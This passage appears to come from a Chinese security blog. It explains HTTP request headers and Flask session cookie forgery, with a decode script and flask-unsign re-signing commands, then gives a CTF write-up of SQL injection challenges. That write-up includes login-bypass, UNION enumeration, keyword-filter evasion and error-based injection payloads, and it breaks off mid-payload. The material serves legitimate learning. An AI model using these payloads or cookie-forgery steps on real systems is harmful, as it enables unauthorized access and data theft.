class_">Language</span>: zh-<span class="variable constant_">CN</span>,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span>,en-<span class="variable constant_">GB</span>;q=<span class="number">0.7</span>,en-<span class="variable constant_">US</span>;q=<span class="number">0.6</span></span><br><span class="line"><span class="title class_">Priority</span>: u=<span class="number">0</span>, i</span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure><h1 id="0x02常见请求头"><a href="#0x02常见请求头" class="headerlink" title="0x02常见请求头"></a>0x02常见请求头</h1><table><thead><tr><th align="left">字段</th><th>含义</th><th>举例</th></tr></thead><tbody><tr><td align="left">Accept</td><td>指定客户端可以接收的内容类型</td><td>Accept:application&#x2F;json, text&#x2F;plain, &#x2F;</td></tr><tr><td align="left">Accept-Charset</td><td>浏览器能够接受的字符编码集</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td align="left">Accept-Encoding</td><td>指定浏览器能够支持的web服务器返回内容压缩编码类型</td><td>Accept-Encoding: gzip, deflate, br</td></tr><tr><td align="left">Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: zh-CN,zh;q&#x3D;0.9</td></tr><tr><td align="left">Accept-Ranges</td><td>能够请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td align="left"><strong>Authorization</strong></td><td><strong>客户端认证信息</strong></td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</td></tr><tr><td align="left">Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: max-age&#x3D;0</td></tr><tr><td align="left"><strong>Connection</strong></td><td><strong>表示是否须要持久链接,HTTP 1.1默认进行持久链接</strong></td><td>Connection: keep-alive</td></tr><tr><td align="left"><strong>Cookie</strong></td><td><strong>HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器</strong></td><td></td></tr><tr><td align="left"><strong>Content-Length</strong></td><td><strong>请求的内容长度</strong></td><td>Content-Length: 348</td></tr><tr><td align="left"><strong>Content-Type</strong></td><td><strong>请求的与实体对应的MIME信息</strong></td><td>Content-Type: application&#x2F;json;charset&#x3D;UTF-8</td></tr><tr><td align="left">Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td align="left">Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td align="left">From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#x65;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#117;&#x73;&#x65;&#114;&#x40;&#x65;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a></td></tr><tr><td align="left"><strong>Host</strong></td><td><strong>指定请求的服务器的域名和端口号</strong></td><td>Host: <a href="http://www.baidu.com/">www.baidu.com</a></td></tr><tr><td align="left">If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td align="left">If-Modified-Since</td><td>若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td align="left">If-None-Match</td><td>若是内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td align="left">If-Range</td><td>若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td align="left">If-Unmodified-Since</td><td>只在实体在指定时间以后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td align="left">Max-Forwards</td><td>限制信息经过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td align="left">Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td align="left">Proxy-Authorization</td><td>链接到代理的受权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</td></tr><tr><td align="left">Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes&#x3D;500-999</td></tr><tr><td align="left"><strong>Referer</strong></td><td><strong>先前网页的地址，当前请求网页紧随其后,即来路</strong></td><td>Referer: <a href="http://www.baidu.com/">www.baidu.com</a></td></tr><tr><td align="left">TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q&#x3D;0.5</td></tr><tr><td align="left">Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（若是支持）</td><td>Upgrade: HTTP&#x2F;2.0, SHTTP&#x2F;1.3, IRC&#x2F;6.9, RTA&#x2F;x11</td></tr><tr><td align="left"><strong>User-Agent(UA)</strong></td><td><strong>User-Agent的内容包含发出请求的用户信息</strong></td><td>User-Agent: Mozilla&#x2F;5.0 (Linux; X11)</td></tr><tr><td align="left">Via</td><td>通知中间网关或代理服务器地址，通讯协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache&#x2F;1.1)</td></tr><tr><td align="left">Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr><tr><td align="left">X-Forwarded-For</td><td>用来说明从哪里来的，一般用来内网伪装</td><td>X-Forwarded-For: 127.0.0.1</td></tr></tbody></table><h1 id="0x03详解"><a href="#0x03详解" class="headerlink" title="0x03详解"></a>0x03详解</h1><h2 id="1-Host-请求主机名-见表格"><a href="#1-Host-请求主机名-见表格" class="headerlink" title="1.Host:请求主机名(见表格)"></a>1.Host:请求主机名(见表格)</h2><h2 id="2-Referer-来源url-见表格"><a href="#2-Referer-来源url-见表格" class="headerlink" title="2.Referer:来源url(见表格)"></a>2.Referer:来源url(见表格)</h2><h2 id="3-Authorization-身份信息"><a href="#3-Authorization-身份信息" class="headerlink" title="3.Authorization:身份信息"></a>3.Authorization:身份信息</h2><p>向服务器提供身份验证信息。要求登录权限的接口，在请求时使用此字段。</p><p>用户登录后，服务器返回token，此后调用其他接口添加Authorization字段，字段value通常格式为“Bearer {toke}”或“Basic {authentication}”。例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</span><br></pre></td></tr></table></figure><h2 id="4-Content-Type内容格式"><a href="#4-Content-Type内容格式" class="headerlink" title="4.Content-Type内容格式"></a>4.Content-Type内容格式</h2><p>是一种 MIME 类型，指定在POST或PUT请求中发送的数据的类型，用于告知服务器请求体的数据类型（如表单数据、JSON数据等）。</p><p>Content-Type 字段的值通常遵循 type&#x2F;subtype 的格式，由三部分组成：主类型type、子类型subtype、可选参数parameter。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：type/subtype[:parameter]（主类型/子类型[;可选参数]）</span><br></pre></td></tr></table></figure><ul><li><p>type : 主类型，任意的字符串，如text，如果是*号代表所有。</p></li><li><p>subtype : 子类型，任意的字符串，如html，如果是*号代表所有，用“&#x2F;”与主类型隔开；是更具体的格式。</p></li><li><p>parameter：可选参数，如charset，boundary等。</p></li></ul><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><table><thead><tr><th>大类</th><th>type&#x2F;subtype</th></tr></thead><tbody><tr><td><strong>text</strong></td><td>text&#x2F;plain：纯文本，不包含任何标记或格式。</td></tr><tr><td></td><td>text&#x2F;html：HTML 格式。当浏览器请求一个网页时，服务器通常返回此类型的响应。</td></tr><tr><td></td><td>text&#x2F;css：CSS 格式样式表</td></tr><tr><td></td><td>text&#x2F;javascript：JavaScript 格式</td></tr><tr><td><strong>image</strong></td><td>image&#x2F;jpeg：JPEG图片</td></tr><tr><td></td><td>image&#x2F;png：PNG图片</td></tr><tr><td></td><td>image&#x2F;gif：GIF图片</td></tr><tr><td></td><td>image&#x2F;svg+xml：SVG 图片</td></tr><tr><td><strong>audio</strong></td><td>audio&#x2F;mpeg：mpeg音频</td></tr><tr><td><strong>video</strong></td><td>video&#x2F;mp4：mp4视频</td></tr><tr><td><strong>multipart</strong></td><td><strong>multipart&#x2F;form-data</strong>：当表单需要上传文件时，通常会使用此类型。它允许你在HTTP请求中发送二进制数据。</td></tr><tr><td><strong>application</strong></td><td><strong>application&#x2F;x-www-form-urlencoded</strong>：表单数据最常见的（默认）编码类型，特别是当表单不包含文件上传时。它表示表单数据已编码为键值对，并使用URL编码进行编码。</td></tr><tr><td></td><td><strong>application&#x2F;json</strong>：JSON 数据格式（JSON是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成。）</td></tr><tr><td></td><td>application&#x2F;pdf：PDF 文档</td></tr><tr><td></td><td>application&#x2F;zip：ZIP 归档数据</td></tr><tr><td></td><td>application&#x2F;x-gzip：GZIP 压缩数据</td></tr><tr><td></td><td>application&#x2F;javascript：JavaScript 脚本</td></tr><tr><td></td><td>application&#x2F;xml：XML格式的数据。（XML是一种用于编码文档的标记语言，被广泛用于网络数据的传输和存储。）</td></tr><tr><td></td><td>application&#x2F;octet-stream：二进制流数据。当服务器不知道或不想指明数据的具体类型时，通常会使用此类型。</td></tr></tbody></table><h2 id="5-Content-Length内容长度"><a href="#5-Content-Length内容长度" class="headerlink" title="5.Content-Length内容长度"></a>5.Content-Length内容长度</h2><p>指定POST或PUT请求中发送的数据的长度。</p><p>Content-Length如果存在并且有效，必须和消息内容的传输长度完全一致，否则就会导致异常。以下为三种情况</p><table><thead><tr><th>Content-Length和实际长度关系</th><th>现象</th></tr></thead><tbody><tr><td>Content-Length &gt; 实际长度</td><td>服务端&#x2F;客户端读取到消息结尾后，会等待下一个字节，自然会无响应直到超时</td></tr><tr><td>Content-Length &#x3D;&#x3D; 实际长度</td><td>服务器正常接收完整数据</td></tr><tr><td>Content-Length &lt; 实际长度</td><td>截取指定长度数据</td></tr></tbody></table><p>如果不确定Content-Length的值，使用：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span><span class="symbol">:chunked</span></span><br></pre></td></tr></table></figure><p>该字段表示分块传输数据，设置这个字段会自动产生两个效果：</p><p>① Content-Length 字段被忽略；</p><p>② 基于长连接持续推送动态内容。</p><h2 id="6-Connection连接类型"><a href="#6-Connection连接类型" class="headerlink" title="6.Connection连接类型"></a>6.Connection连接类型</h2><p>客户端与服务连接类型。</p><p><strong>3种取值：</strong>keep-alive（长链接接）、close（短链接）、upgrade（升级协议）。</p><p>HTTP&#x2F;1.0协议默认值为close；</p><p>HTTP&#x2F;1.1协议默认值为keep-alive。</p><p><strong>举例：</strong></p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Connection</span><span class="symbol">:keep-alive</span></span><br></pre></td></tr></table></figure><h2 id="7-User-Agent客户端信息"><a href="#7-User-Agent客户端信息" class="headerlink" title="7.User-Agent客户端信息"></a>7.User-Agent客户端信息</h2><p>发送请求的浏览器或其他客户端软件的信息。可以包括浏览器的名称和版本、操作系统等信息。</p><h3 id="常见的User-Agent值"><a href="#常见的User-Agent值" class="headerlink" title="常见的User-Agent值"></a>常见的User-Agent值</h3><p>1、Chrome(谷歌)<br>【Win7】</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.1 (KHTML, like Gecko) Chrome&#x2F;14.0.835.163 Safari&#x2F;535.1</p><p>【Win10】</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;73.0.3683.103 Safari&#x2F;537.36</p><p>【Chrome 17.0 – MAC】</p><p>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit&#x2F;535.11 (KHTML, like Gecko) Chrome&#x2F;17.0.963.56 Safari&#x2F;535.11</p><p>2、Firefox(火狐)<br>【Win7】</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko&#x2F;20100101 Firefox&#x2F;6.0</p><p>【Firefox 4.0.1 – MAC】</p><p>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko&#x2F;20100101 Firefox&#x2F;4.0.1</p><p>3、Safari(苹果计算机操作系统Mac OS中的浏览器)<br>【safari 5.1 – MAC】</p><p>User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit&#x2F;534.50 (KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50</p><p>【safari 5.1 – Windows】</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit&#x2F;534.50 (KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50</p><p>4、Opera(欧朋浏览器可以在Windows、Mac和Linux三个操作系统平台上运行)<br>【Opera 11.11 – MAC】</p><p>User-Agent:Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto&#x2F;2.8.131 Version&#x2F;11.11</p><p>【Opera 11.11 – Windows】</p><p>User-Agent:Opera&#x2F;9.80 (Windows NT 6.1; U; en) Presto&#x2F;2.8.131 Version&#x2F;11.11</p><p>5、IE<br>【IE 11】</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</p><p>【IE 9.0】</p><p>User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident&#x2F;5.0;</p><p>【IE 8.0】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident&#x2F;4.0)</p><p>【IE 7.0】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.0)</p><p>【IE 6.0】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</p><p>【WinXP+ie8】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident&#x2F;4.0; GTB7.0)</p><p>【WinXP+ie7】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p><p>【WinXP+ie6】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</p><p>6、傲游<br>【傲游（Maxthon）】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)</p><p>7、搜狗<br>【搜狗浏览器 1.x】</p><p>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident&#x2F;4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)</p><p>8、360<br>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)</p><p>9、QQ浏览器<br>User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)</p><h2 id="8-Accept接收数据格式"><a href="#8-Accept接收数据格式" class="headerlink" title="8.Accept接收数据格式"></a>8.Accept接收数据格式</h2><p>指定客户端接受的数据类型，取值基本同Content-Type。accept可取多个值，以英文“,”分隔，每个值可设置权重（weight）参数q，用于在多种可能的类型都不支持时指定回退选项的优先级。</p><h3 id="Accept常见的数据类型取值"><a href="#Accept常见的数据类型取值" class="headerlink" title="Accept常见的数据类型取值"></a>Accept常见的数据类型取值</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>*/*</code></td><td>客户端接受任何格式的应答</td></tr><tr><td>text&#x2F;html</td><td>HTML格式</td></tr><tr><td>text&#x2F;plain</td><td>纯文本格式</td></tr><tr><td>text&#x2F;xml</td><td>XML格式</td></tr><tr><td>image&#x2F;gif</td><td>gif图片格式</td></tr><tr><td>image&#x2F;jpeg</td><td>jpg图片格式</td></tr><tr><td>image&#x2F;png</td><td>png图片格式</td></tr><tr><td>video&#x2F;mpeg</td><td>视频</td></tr><tr><td>vedio&#x2F;quicktime</td><td>视频</td></tr><tr><td>application&#x2F;xhtml+xml</td><td>XHTML格式</td></tr><tr><td>application&#x2F;xml</td><td>XML数据格式</td></tr><tr><td>application&#x2F;atom+xml</td><td>Atom XML聚合格式</td></tr><tr><td>application&#x2F;json</td><td>JSON数据格式</td></tr><tr><td>application&#x2F;pdf</td><td>pdf格式</td></tr><tr><td>application&#x2F;msword</td><td>Word文档格式</td></tr><tr><td>application&#x2F;octet-stream</td><td>二进制流数据（如常见的文件下载）</td></tr><tr><td>application&#x2F;x-www-form-urlencoded</td><td>&lt; form encType&#x3D;””&gt;中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）</td></tr></tbody></table><h2 id="9-cookies浏览器缓存"><a href="#9-cookies浏览器缓存" class="headerlink" title="9.cookies浏览器缓存"></a>9.cookies浏览器缓存</h2><p>cookie是一门客户端技术，一般是由服务器生成返回给浏览器客户端来保存的，并且cookie是以键值对的形式保存在浏览器客户端的，每一个cookie都会有名称，值，过期时间</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">格式  <span class="symbol">cookies:</span> key1=value1;key2=value2…</span><br></pre></td></tr></table></figure><p>这里还要补充一个知识点，就是cookie中的session伪造</p><h3 id="补充-session伪造"><a href="#补充-session伪造" class="headerlink" title="补充:session伪造"></a>补充:session伪造</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>flask中的session是存储在客户端的cookie中，flask仅对数据进行签名，所以session的全部内容都可以在客户端读取，flask通过一个secret_key密钥对数据 进行签名来防止session被篡改。</p><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><p>得到session信息 并且 知道flask的签名的SECRET_KEY</p><h4 id="session结构"><a href="#session结构" class="headerlink" title="session结构"></a>session结构</h4><p>flask session通常是由三部分组成，中间通过<code>.</code>来进行分割，第一部分就是我们json形式的数据通过base64加密后的结果，第二部分是时间戳，也算是签名算法，第三部分就是我们的密钥签名</p><ul><li><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p></li><li><p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p></li></ul><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;待解密的session值&quot;</span>.encode()))<span class="comment">#把需要加密的flasksession的值换一下就行</span></span><br></pre></td></tr></table></figure><h4 id="通过flask-unsign进行加解密"><a href="#通过flask-unsign进行加解密" class="headerlink" title="通过flask_unsign进行加解密"></a>通过flask_unsign进行加解密</h4><p>python安装flask-unsign库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install flask-unsign</span><br></pre></td></tr></table></figure><p>先对cookie进行解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask-unsign --decode --cookie <span class="string">&#x27;待解密内容&#x27;</span></span><br></pre></td></tr></table></figure><p>签名加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;待加密内容(json数据)&quot;</span> --secret <span class="string">&#x27;密钥&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019</title>
      <link href="/2025/01/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
      <url>/2025/01/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114000406548.png" alt="image-20250114000406548"></p><p>直接万能密码闭合后登录即获得flag</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">闭合后语句username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>使用万能密码尝试</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114002423442.png" alt="image-20250114002423442"></p><p>有回显位置了，且题目提示flag放在了其他位置，下述payload的password均为上图数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; order by 3# </span></span><br><span class="line"><span class="string">order by判断列数，列数为4时报错</span></span><br><span class="line"><span class="string">username=a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">用不存在的username才能找到回显位，不然使用admin只会重复上图，回显位为<span class="number">2</span>，<span class="number">3</span></span><br><span class="line">username<span class="operator">=</span>a<span class="string">&#x27; union select 1,(database()),3#</span></span><br><span class="line"><span class="string">库名为geek</span></span><br><span class="line"><span class="string">username=a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;geek&#x27;</span>),<span class="number">3</span>#</span><br><span class="line">表名有geekuser,l0ve1ysq1</span><br><span class="line">username<span class="operator">=</span>a<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;),3#</span></span><br><span class="line"><span class="string">列名有id,username,password</span></span><br><span class="line"><span class="string">username=a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> l0ve1ysq1),<span class="number">3</span>#</span><br><span class="line">获得flag</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>同样的payload</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114001017855.png" alt="image-20250114001017855"></p><p>发现or没了，推测过滤or，尝试双写绕过成功登录(大小写绕过失败，换为||成功)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; oorr 1=1#</span></span><br><span class="line"><span class="string">如果是双写能成功登录就可直接爆库表列flag，但是双写不能绕过or过滤时，相当于过滤information_schema表，此时表名可通过mysql.innodb_table_stats表中相同方式爆出，flag通过无列名注入爆出</span></span><br><span class="line"><span class="string">username=admin&#x27;</span> oorrder <span class="keyword">by</span> <span class="number">3</span>#</span><br><span class="line">此时仍然报错了，根据报错内容推测把<span class="keyword">by</span>也过滤了</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; oorrder bbyy 3#</span></span><br><span class="line"><span class="string">成功登录，接下来正常流程</span></span><br><span class="line"><span class="string">username=a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">这个payload也报错，根据报错内容推测<span class="keyword">union</span>和<span class="keyword">select</span>都ban了</span><br><span class="line">username<span class="operator">=</span>a<span class="string">&#x27; ununionion seselectlect 1,2,3#</span></span><br><span class="line"><span class="string">成功找到回显位为2，3</span></span><br><span class="line"><span class="string">username=a&#x27;</span> ununionion seselectlect <span class="number">1</span>,(database()),<span class="number">3</span>#</span><br><span class="line">库名为geek</span><br><span class="line">username<span class="operator">=</span>a<span class="string">&#x27; ununionion seselectlect 1,(seselectlect group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;</span>geek<span class="string">&#x27;),3#</span></span><br><span class="line"><span class="string">还报错，根据报错提示将from和where也双写</span></span><br><span class="line"><span class="string">username=a&#x27;</span> ununionion seselectlect <span class="number">1</span>,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema<span class="operator">=</span><span class="string">&#x27;geek&#x27;</span>),<span class="number">3</span>#</span><br><span class="line">表名为b4bsql,geekuser</span><br><span class="line">username<span class="operator">=</span>a<span class="string">&#x27; ununionion seselectlect 1,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;),3#</span></span><br><span class="line"><span class="string">列名为id,username,password</span></span><br><span class="line"><span class="string">username=a&#x27;</span> ununionion seselectlect <span class="number">1</span>,(seselectlect group_concat(passwoorrd) frfromom b4bsql),<span class="number">3</span>#</span><br><span class="line">获得flag(注意爆flag时password中也有<span class="keyword">or</span>)</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>随便尝试万能密码注入，显示错误，用bpfuzz判断一下哪些字符被过滤了</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250114151130916.png" alt="image-20250114151130916"></p><p>可以看到很多字符被过滤了，而ascii,left,join,select,floor,like,updatexml等关键词未被过滤</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">尝试报错注入</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))#</span></span><br><span class="line"><span class="string">库名为geek,注意等号也被过滤了</span></span><br><span class="line"><span class="string">password=1&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span 